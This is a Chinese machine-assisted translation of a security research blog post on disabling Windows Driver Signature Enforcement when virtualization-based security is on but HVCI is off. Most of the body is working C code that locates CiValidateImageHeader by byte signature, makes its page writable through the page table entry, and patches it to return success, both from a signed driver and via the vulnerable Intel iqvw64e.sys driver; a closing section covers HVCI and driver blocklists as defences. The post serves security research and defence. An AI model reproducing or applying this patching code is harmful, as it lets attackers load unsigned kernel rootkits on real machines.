> (翻译源： https://blog.xpnsec.com/gcioptions-in-a-virtualized-world/)
>

> 全文ChatGPT3.5 翻译，中间小小的修改。禁当入门记录，免得下次看的时候陌生。

   随着代码签名证书的泄露和针对易受攻击的驱动程序的利用成为常见现象，攻击者正在将内核作为他们的新游乐场。而且，随着微软推出了诸如虚拟化基础安全（Virtualization Based Security，VBS）和Hypervisor Code Integrity（HVCI）等技术，我希望花些时间了解在面对试图逃脱到Ring-0（内核模式）的攻击者时，终端节点的脆弱性。

​    在本文中，我们将研究一种常见的技术，用于禁用驱动程序签名强制执行的方法，以及VBS如何试图阻止攻击者利用这一点，以及如果没有搭配HVCI，绕过这种安全控制有多容易。



### 驱动签名强制

​      驱动程序签名强制执行（Driver Signature Enforcement，DSE）是Windows长期以来采用的一种方法，用于防止攻击者加载未签名的驱动程序到内核中。这在很大程度上是确保攻击者不能轻易绕过内核中实施的许多安全功能，例如通过修改EPROCESS字段来干扰进程保护灯（Process Protection Light，PPL）。(来自微软自己的翻译，chat翻译的是：进程保护轻量级)。

​     为了绕过这一限制，攻击者有几种选择。首先，他们可以向目标提供一个脆弱的驱动程序，该驱动程序满足所有加载要求，但允许攻击者利用其缺陷进行内存修改，从而加载更多未签名的驱动程序到内核中。其次，攻击者可以利用之前曝光的签名证书，将自己的驱动代码签名，直接加载到内核中。随着最近的泄露事件，比如LAPSUS$ NVidia泄露，这种技术成为攻击者更加明显的途径。

### 禁用驱动程序签名强制

​    如果我们想在不将操作系统重新启动为调试或测试模式的情况下禁用驱动程序签名强制执行怎么办？在最新版本的Windows中，DSE是通过一个名为CI.dll的模块强制执行的，在其中暴露了一个名为g_CiOptions的配置变量：

`dd CI!g_ciOptions L1`

![image1_ab6wcz](https://kcufid.github.io/images/pic/2023-07-19\image1_ab6wcz.png)

​    这个配置变量有许多可以设置的标志，但通常用于绕过驱动程序签名强制执行（DSE）时，该值被设置为0，完全禁用了DSE，并允许攻击者轻易地加载未签名的驱动程序。

长期以来，这一方法运行得非常顺利，并且为向操作系统侧加载未签名的驱动程序提供了简便的途径。但是，随后在Windows 10中引入的虚拟化基础安全（Virtualization-Based Security，VBS）却破坏了这种轻松状态。

### 虚拟化安全

​    回到现在：微软已经做出了重大努力来保护内核免受篡改。在2018年的Bluehat大会上，David Weston进行了一场精彩的演讲，总结了这些努力的原因，其中主要原因之一是安全法则的转变。例如，“如果坏人能够说服你在计算机上运行他的程序，那么这台计算机就不再属于你”的法则不再成立，因此微软花费了时间加固其操作系统以反映这一点。

微软部署的一项用于加固内核免受攻击的技术被称为“虚拟化基础安全”（Virtualization Based Security，VBS）。这在Windows 10和11上默认启用，提供了一个由虚拟化保护的环境，其中运行着第二个“安全内核”，传统内核运行在Ring-0中，无法触及这个“安全内核”。

需要注意的是，现在有一些混淆了VBS和HVCI的情况。VBS并不等同于HVCI。这种混淆在防御者中很容易发生，因为存在许多混淆这两种技术的内容。HVCI可以看作是在VBS框架下运行，但需要单独的配置才能启用。

那么VBS如何防止使用泄漏的证书或易受攻击的驱动程序来禁用驱动程序签名强制执行呢？让我们来看一下CI.dll中如何解析g_CiOptions变量：

![image2_ykmuh3](https://kcufid.github.io/images/pic/2023-07-19\image2_ykmuh3.png)

在这里，我们可以看到对MmProtectDriverSection的使用，这是一个作为Kernel Data Protection（KDP）技术的一部分而提供的API（另一个在VBS框架下的缩写）。该API确保在传递了一个内存地址后，运行在Ring-0中的代码无法修改其内容。

即使我们尝试使用附加到内核的WinDBG（通过将DebugFlags设置为0x10启用了DSE），我们仍然无法更新存储的值：

![image3_ye4a8a](https://kcufid.github.io/images/pic/2023-07-19\image3_ye4a8a.png)

这意味着当启用了VBS后，我们将不得不寻找其他方法来禁用DSE。

### 通过patch 取消DSE

​      如果您之前跟踪过许多 AMSI（Antimalware Scan Interface）绕过技术，您可能对我们在这里绕过此保护所能做的事情感到熟悉...我们进行代码补丁。首先，我们需要了解需要进行代码补丁的位置，因此让我们进入内核调试器会话，并在一个我们知道可能会检查策略的位置添加一个断点。根据对CI.dll的审查，CiCheckPolicyBits看起来是一个适合设置断点的函数。从这里开始，尝试加载未签名的驱动程序会产生一个如下的调用堆栈：

![image4_mmaemq](https://kcufid.github.io/images/pic/2023-07-19\image4_mmaemq.png)

​    在这里，我们看到从内核转入CI（Code Integrity）通过SeValidateImageHeader，并调用了CiValidateImageHeader函数。这个函数负责验证我们的驱动程序是否符合签名要求。让我们在SeValidateImageHeader中添加一个断点，以查看在加载未签名驱动程序失败时CiValidateImageHeader的返回值：

![image5_aivejm](https://kcufid.github.io/images/pic/2023-07-19\image5_aivejm.png)

​    这的确看起来像是一个NTSTATUS代码。在魔法数字数据库中搜索显示c0000428对应于STATUS_INVALID_IMAGE_HASH，这意味着驱动程序的映像哈希无效，因此未通过签名验证。

您的分析是正确的，如果这个函数返回STATUS_SUCCESS，它将绕过签名检查，允许未签名的驱动程序成功加载。

幸运的是，我们也知道这个方法没有受到Kernel Data Protection的保护，所以现在我们只需要找出一种允许写入这个内存位置的方法。

### 禁用带有签名驱动程序的DSE

​     我们创建一个快速的驱动程序，用于禁用DSE时的概念更容易理解。显然，一旦构建完成，这个驱动程序必须使用证书签名后才能加载。出于在下一节中将变得明显的原因，我们将重点关注通过读写来填充CiValidateImageHeader，但请随意使用创造性的解决方案。显然，有很多可以劫持的地方！

首先，我们修改内核中CiValidateImageHeader的内存保护。最直接的方法是直接修改虚拟地址的页面表项（PTE）。为了获取CiValidateImageHeader的页面表项，我们首先需要找到一个方法，允许我们将虚拟地址转换为对应的PTE。

对于经常涉足游戏作弊的人，您可能知道在这种情况下我们使用的函数是MiGetPteAddress。关于如何找到这个方法的精彩解释，请查看@33y0re的关于PTE覆写的博客文章。这个函数实际上会揭示我们后续需要的PTE基址，在下面可以看到它是0FFFFCE8000000000，但在每次重新启动后都会更新：

![image6_cjcasa](https://kcufid.github.io/images/pic/2023-07-19\image6_cjcasa.png)

​     为了找到这个函数，我们需要在内存中搜索字节特征( byte signature)。我们可以使用类似以下的方法来实现：

```c
void* signatureSearch(char* base, char* inSig, int length, int maxHuntLength) {
	for (int i = 0; i < maxHuntLength; i++) {
		if (base[i] == inSig[0]) {
			if (memcmp(base + i, inSig, length) == 0) {
				return base + i;
			}
		}
	}

	return NULL;
}
...
```

​    通过在内存中搜索与MiGetPteAddress匹配的特征，我们可以提取PTE基址，并将虚拟地址解析为PTE位置：

```c
char MiGetPteAddressSig[] = { 0x48, 0xc1, 0xe9, 0x09, 0x48, 0xb8, 0xf8, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00, 0x00, 0x48, 0x23, 0xc8, 0x48, 0xb8 };

void* FindPageTableEntry(void* addr) {

	ULONG_PTR MiGetPteAddress = signatureSearch(&ExAcquireSpinLockSharedAtDpcLevel, MiGetPteAddressSig, sizeof(MiGetPteAddressSig), 0x30000);
	
	if (MiGetPteAddress == NULL) {
		return NULL;
	}
	
	ULONG_PTR PTEBase = *(ULONG_PTR*)(MiGetPteAddress + sizeof(MiGetPteAddressSig));
	ULONG_PTR address = addr;
	address = address >> 9;
	address &= 0x7FFFFFFFF8;
	address += (ULONG_PTR)PTEBase;
	return address;
	
}
```

​    现在我们能够解析虚拟地址的PTE了，我们需要找到*CiValidateImageHeader*的虚拟地址。由于这个函数没有被CI.dll导出，我们将再次通过特征来查找它：

```c
char CiValidateImageHeaderSig[] = { 0x48, 0x33, 0xc4, 0x48, 0x89, 0x45, 0x50, 0x48, 0x8b };
const int CiValidateImageHeaderSigOffset = 0x23;

ULONG_PTR CiValidateImageHeader = signatureSearch(CiValidateFileObjectPtr, CiValidateImageHeaderSig, sizeof(CiValidateImageHeaderSig), 0x100000);

if (CiValidateImageHeader == NULL) {
  return;
}

CiValidateImageHeader -= CiValidateImageHeaderSigOffset;
```

​    

一旦我们获得了*CiValidateImageHeader*的地址，我们可以为虚拟地址获取其对应的PTE位置。我们只需要在相应的PTE值中翻转一个位，强制包含*CiValidateImageHeader*的内存页面变为可写：

```c
ULONG64 *pte = FindPageTableEntry(CiValidateImageHeader);
*pte = *pte | 2;
```

设置页面为可写后，接下来我们只需要用*xor rax, rax; ret*来修补函数的开头，确保我们备份原始指令以供稍后恢复：

```c
char retShell[] = { 0x48, 0x31, 0xc0, 0xc3 };
char origBytes[4];

memcpy(origBytes, CiValidateImageHeader, 4);
memcpy(CiValidateImageHeader, retShell, 4);
```

然后返回页面保护:

```c
*pte = *pte ^ 2;
// After this, page protection is reverted
```

执行后，让我们尝试加载我们的未签名驱动程序：    油管视频

https://www.youtube.com/watch?v=uSNivgtM5BM

一旦我们加载了未签名的驱动程序，另一个重要的事项是恢复先前的函数补丁，以避免与PatchGuard引起的任何问题。同样，这很简单，只需撤销我们的代码更改：

```c
*pte = *pte | 2;
memcpy(CiValidateImageHeader, origBytes, 4);
*pte = *pte ^ 2;
```

### 通过易受攻击的驱动程序禁用DSE

​    现在我们已经了解了所有的组成部分，让我们考虑另一种情况：如果我们想使用易受攻击的驱动程序而不是使用带有泄漏证书的恶意驱动程序来禁用DSE怎么办？正如我们在上面所见，我们只需要在易受攻击的驱动程序中具备读/写权限，而这样的驱动程序并不少见！

​    让我们使用一个易受攻击的驱动程序来禁用DSE。在这种情况下，我们将使用Intel的iqvw64e.sys驱动程序，这是一个相当流行的驱动程序。由于这次我们不在内核中执行代码，我们需要进行一些额外的步骤来在用户模式下计算地址。

​    首先，我们需要获取ntoskrnl.exe和ci.dll的基址。可以通过NtQuerySystemInformation和SystemModuleInformation很容易地获取这些基址：

```c
ULONG_PTR GetKernelModuleAddress(const char *name) {

	DWORD size = 0;
	void* buffer = NULL;
	PRTL_PROCESS_MODULES modules;
	
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, size, &size);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, size, &size);
	}

	if (!NT_SUCCESS(status))
	{
		VirtualFree(buffer, 0, MEM_RELEASE);
		return NULL;
	}

	modules = (PRTL_PROCESS_MODULES)buffer;

	for (int i=0; i < modules->NumberOfModules; i++)
	{
		char* currentName = (char*)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;

		if (!_stricmp(currentName, name)) {
			ULONG_PTR result = (ULONG_PTR)modules->Modules[i].ImageBase;

			VirtualFree(buffer, 0, MEM_RELEASE);
			return result;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return NULL;
}
...

ULONG_PTR kernelBase = GetKernelModuleAddress("ntoskrnl.exe");
ULONG_PTR ciBase = GetKernelModuleAddress("CI.dll");
```

​    接下来，我们需要完成我们的特征搜索。最简单的方法是将文件映射到SEC_IMAGE，并在内存中搜索PE节区：

```c
void* mapFileIntoMemory(const char* path) {

	HANDLE fileHandle = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE) {
		return NULL;
	}

	HANDLE fileMapping = CreateFileMapping(fileHandle, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (fileMapping == NULL) {
		CloseHandle(fileHandle);
		return NULL;
	}

	void *fileMap = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
	if (fileMap == NULL) {
		CloseHandle(fileMapping);
		CloseHandle(fileHandle);
	}

	return fileMap;
}

void* signatureSearch(char* base, char* inSig, int length, int maxHuntLength) {
	for (int i = 0; i < maxHuntLength; i++) {
		if (base[i] == inSig[0]) {
			if (memcmp(base + i, inSig, length) == 0) {
				return base + i;
			}
		}
	}

	return NULL;
}

ULONG_PTR signatureSearchInSection(char *section, char* base, char* inSig, int length) {

	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)base;
	IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)((char*)base + dosHeader->e_lfanew);
	IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((char*)ntHeaders + sizeof(IMAGE_NT_HEADERS64));
	IMAGE_SECTION_HEADER* textSection = NULL;
	ULONG_PTR gadgetSearch = NULL;

	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
		if (memcmp(sectionHeaders[i].Name, section, strlen(section)) == 0) {
			textSection = &sectionHeaders[i];
			break;
		}
	}

	if (textSection == NULL) {
		return NULL;
	}

	gadgetSearch = (ULONG_PTR)signatureSearch(((char*)base + textSection->VirtualAddress), inSig, length, textSection->SizeOfRawData);

	return gadgetSearch;
}

...
const char MiGetPteAddressSig[] = { 0x48, 0xc1, 0xe9, 0x09, 0x48, 0xb8, 0xf8, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00, 0x00, 0x48, 0x23, 0xc8, 0x48, 0xb8 };

const char CiValidateImageHeaderSig[] = { 0x48, 0x33, 0xc4, 0x48, 0x89, 0x45, 0x50, 0x48, 0x8b };

const int CiValidateImageHeaderSigOffset = 0x23;

gadgetSearch = signatureSearchInSection((char*)".text", (char*)kernelBase, MiGetPteAddressSig, sizeof(MiGetPteAddressSig));

MiGetPteAddress = gadgetSearch - kernelBase + sizeof(MiGetPteAddressSig);

gadgetSearch = signatureSearchInSection((char*)"PAGE", (char*)ciMap, CiValidateImageHeaderSig, sizeof(CiValidateImageHeaderSig));

CiValidateImageHeader = gadgetSearch - ciMap + ciBase - CiValidateImageHeaderSigOffset;
...
```

​    完成后，我们需要读取PTE基地址：

```c
// Use intel driver vuln to copy kernel memory between user/kernel space
copyKernelMemory(devHandle, (ULONG_PTR)&pteBase, MiGetPteAddress, sizeof(void*))
```

​    接下来，我们需要读取MiGetPteAddress的PTE条目，以便进行修改：

```c
ULONG_PTR getPTEForVA(ULONG_PTR pteBase, ULONG_PTR address) {
	ULONG_PTR PTEBase = pteBase;
	address = address >> 9;
	address &= 0x7FFFFFFFF8;
	address += (ULONG_PTR)PTEBase;

	return address;
}

ULONG_PTR pteAddress = getPTEForVA(pteBase, CiValidateImageHeader);
copyKernelMemory(devHandle, (ULONG_PTR)&pte, pteAddress, 8);
```

​    更新页面的写入位（write bit):

```c
pte |= 2;
```

​     最后，patch它：

```c
copyKernelMemory(devHandle, (ULONG_PTR)origMem, CiValidateImageHeader, sizeof(origMem));

copyKernelMemory(devHandle, CiValidateImageHeader, (ULONG_PTR)retShell, sizeof(retShell));
```

完成所有这些步骤后，我们发现我们可以再次加载未签名的驱动程序，因为DSE已被禁用:

  油管视频： https://www.youtube.com/watch?v=j0jb8x4C638

  加载完成后，记着把修改的再修改回去，免得PatchGuard蓝屏。。。

### 保护

​    因此，我们应该如何防范这样的攻击？对于防御者来说，有几个选项可供选择。首先是HVCI！

HVCI使用第二级地址表（SLAT）来确保被映射为读-执行的页面不能被设置为可写，并确保读写页面不能在PTE中设置执行位。可以想象，这使得像上面那样的操作变得非常困难，因为我们无法再简单地对可执行内存进行代码补丁。

例如，让我们尝试在启用HVCI的情况下重新运行上面的场景：

![image7_mfl3qx](https://kcufid.github.io/images/pic/2023-07-19\image7_mfl3qx.png)

​    如果我们获取内存转储并将其加载到WinDBG中，我们可以看到，尽管我们试图更新内存页面的保护，但我们的memcpy仍然导致了SYSTEM SERVICE EXCEPTION：

![image8_zvjdmb](https://kcufid.github.io/images/pic/2023-07-19\image8_zvjdmb.png)

​    如果无法启用HVCI，接下来可以考虑使用微软的"攻击面减小"（Attack Surface Reduction）。这个功能会阻止一系列常被利用的易受攻击的驱动程序和泄露的代码签名证书。再次阻止了攻击者进入内核所需的立足点，但由于存在大量驱动程序漏洞，它的效果较差。

